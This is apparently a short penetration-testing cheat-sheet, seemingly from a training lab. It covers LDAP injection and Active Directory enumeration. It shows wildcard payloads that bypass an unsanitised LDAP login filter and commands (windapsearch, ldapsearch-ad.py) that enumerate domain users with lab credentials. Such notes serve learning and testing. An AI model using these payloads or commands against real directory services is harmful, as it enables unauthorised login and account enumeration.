# Attacks
### LDAP Injections

```
An asterisk * can match any number of characters.
( ) 	Parentheses ( ) can group expressions.
| 		A vertical bar | can perform logical OR.
& 		An ampersand & can perform logical AND.
(cn=*) 	Input values that try to bypass authentication or authorisation checks by injecting conditions that always evaluate to true can be used. 
		For example, (cn=*) or (objectClass=*) can be used as input values for a username or password fields.
```

Example code snippet (no sanification on user or password is made which is `suceptible to Injection):`
`(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))`

```
$username = "*";
$password = "dummy";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```
(Any username)
OR
```
$username = "dummy";
$password = "*";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```
(Any password)

## Anonymous surfing
You might be able to run some queries to AD via LDAP as anonymous user. 
[ropnop/go-windapsearch: Utility to enumerate users, groups and computers from a Windows domain through LDAP queries (github.com)](https://github.com/ropnop/go-windapsearch)

```
./windapsearch-linux-amd64 --dc 10.129.42.188 -u "" -m users
```
Or with another tool which is more handy...
```
ldapsearch-ad.py -l 10.129.42.188 -d inlanefreight -u james.cross -p 'Academy_Student!' -t show-user -s '(samaccountname=s*)'
```
